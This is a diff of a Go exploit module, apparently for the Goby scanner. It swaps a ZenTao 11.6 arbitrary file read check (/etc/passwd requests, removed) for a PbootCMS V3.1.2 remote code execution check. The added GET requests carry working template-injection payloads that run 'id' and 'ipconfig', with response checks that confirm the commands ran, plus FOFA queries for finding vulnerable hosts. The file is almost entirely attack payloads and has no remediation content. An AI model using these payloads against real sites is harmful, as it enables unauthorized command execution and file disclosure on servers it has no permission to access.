@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞",
+  "Name": "PbootCMS V3.1.2 正则绕过 RCE 漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "app=\"易软天创-禅道系统\" || product=\"易软天创-禅道系统\"",
-  "GobyQuery": "app=\"易软天创-禅道系统\" || product=\"易软天创-禅道系统\"",
-  "Level": "2",
+  "FofaQuery": "app=\"PBOOTCMS\" || product=\"PBOOTCMS\"",
+  "GobyQuery": "app=\"PBOOTCMS\" || product=\"PBOOTCMS\"",
+  "Level": "3",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -30,9 +30,13 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/api-getModel-file-parseCSV-fileName=/etc/passwd",
+        "uri": "/index.php/keyword?keyword=}{pboot:if((get_lg/*aaa-*/())/**/(get_backurl/*aaa-*/()))}123321aaa{/pboot:if}&backurl=;id",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "X-Requested-With": "XMLHttpRequest",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept-Language": "zh-CN,zh;q=0.9"
+        },
         "data_type": "text",
         "data": ""
       },
@@ -51,7 +55,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "root:",
+            "value": "uid=",
             "bz": ""
           }
         ]
@@ -61,9 +65,13 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/api-getModel-api-getMethod-filePath=/etc/passwd/1",
+        "uri": "/?member/login/?a=}{pboot:if((get_lg/*aaa-*/())/**/(\"ipconfig\"))}{/pboot:if}",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "X-Requested-With": "XMLHttpRequest",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept-Language": "zh-CN,zh;q=0.9"
+        },
         "data_type": "text",
         "data": ""
       },
@@ -82,69 +90,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "root:",
-            "bz": ""
-          }
-        ]
-      },
-      "SetVariable": []
-    },
-    {
-      "Request": {
-        "method": "GET",
-        "uri": "/zentao/api-getModel-api-getMethod-filePath=/etc/passwd/1",
-        "follow_redirect": true,
-        "header": {},
-        "data_type": "text",
-        "data": ""
-      },
-      "ResponseTest": {
-        "type": "group",
-        "operation": "AND",
-        "checks": [
-          {
-            "type": "item",
-            "variable": "$code",
-            "operation": "==",
-            "value": "200",
-            "bz": ""
-          },
-          {
-            "type": "item",
-            "variable": "$body",
-            "operation": "contains",
-            "value": "root:",
-            "bz": ""
-          }
-        ]
-      },
-      "SetVariable": []
-    },
-    {
-      "Request": {
-        "method": "GET",
-        "uri": "/zentao/api-getModel-file-parseCSV-fileName=/etc/passwd",
-        "follow_redirect": true,
-        "header": {},
-        "data_type": "text",
-        "data": ""
-      },
-      "ResponseTest": {
-        "type": "group",
-        "operation": "AND",
-        "checks": [
-          {
-            "type": "item",
-            "variable": "$code",
-            "operation": "==",
-            "value": "200",
-            "bz": ""
-          },
-          {
-            "type": "item",
-            "variable": "$body",
-            "operation": "contains",
-            "value": "root:",
+            "value": "Windows IP",
             "bz": ""
           }
         ]
@@ -200,7 +146,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞",
+      "Name": "PbootCMS V3.1.2 正则绕过 RCE 漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -209,7 +155,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "zentao 11.6 api-getModel-api-getMethod-filePath file read",
+      "Name": "PbootCMS V3.1.2 RCE",
       "Product": "",
       "Description": "",
       "Recommendation": "",
